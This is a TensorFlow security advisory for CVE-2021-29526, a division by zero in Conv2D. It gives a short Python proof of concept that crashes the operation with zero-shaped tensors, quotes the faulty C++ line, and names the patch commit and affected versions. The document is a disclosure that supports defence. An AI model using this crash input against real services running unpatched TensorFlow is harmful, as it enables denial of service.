<h2>TFSA-2021-015: Division by 0 in <code>Conv2D</code></h2>
<h3>CVE Number</h3>
<p>CVE-2021-29526</p>
<h3>Impact</h3>
<p>An attacker can trigger a division by 0 in <code>tf.raw_ops.Conv2D</code>:</p>
<p>```python
import tensorflow as tf</p>
<p>input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)</p>
<p>strides = [1, 1, 1, 1]
padding = "SAME"</p>
<p>tf.raw_ops.Conv2D(input=input, filter=filter, strides=strides, padding=padding)
```</p>
<p>This is because the
<a href="https://github.com/tensorflow/tensorflow/blob/988087bd83f144af14087fe4fecee2d250d93737/tensorflow/core/kernels/conv_ops.cc#L261-L263">implementation</a> does a division by a quantity that is controlled by the caller:</p>
<p><code>cc
  const int64 patch_depth = filter.dim_size(2);
  if (in_depth % patch_depth != 0) { ... }</code></p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/b12aa1d44352de21d1a6faaf04172d8c2508b42b">b12aa1d44352de21d1a6faaf04172d8c2508b42b</a>.</p>
<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.</p>
